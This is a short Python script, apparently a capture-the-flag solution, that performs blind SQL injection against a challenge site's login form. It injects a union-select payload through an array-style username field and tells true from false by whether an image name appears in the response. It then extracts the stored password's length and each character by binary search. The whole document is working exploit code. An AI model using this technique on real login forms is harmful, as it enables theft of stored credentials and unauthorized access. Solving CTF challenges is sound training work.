import requests

BASE_URL = 'https://sao.h4ck3r.quest'

home = requests.get(BASE_URL).text
MY_IP = home[home.find('<code>') + 6:home.find('</code>')]

def test(payload):
    return 'uso.jpeg' in requests.post(BASE_URL + '/login', data={
        'username[]': f"kirito' and {payload} union select 'x', 'pwd', '{MY_IP}",
        'password': "pwd"}
    ).text


def get_flag_length():
    for i in range(6, 0xff):
        if test(f"(select length(password) from users where id=1) = {i}"):
            return i


if __name__ == '__main__':
    flag_len = get_flag_length()
    print(f"Flag length: {flag_len}")

    FLAG = ''
    for nth in range(1, flag_len+1):
        # binary search
        lower_bound, upper_bound = 0x000000, 0x10FFFF

        while True:
            mid = (upper_bound + lower_bound) // 2

            if test(f"(select unicode(substr(password, {nth}, 1)) from users where id=1) < {mid}"):
                upper_bound = mid
            else:
                lower_bound = mid

            if upper_bound - lower_bound == 1:
                FLAG += chr(lower_bound)
                print(f"FLAG: {FLAG}")
                break
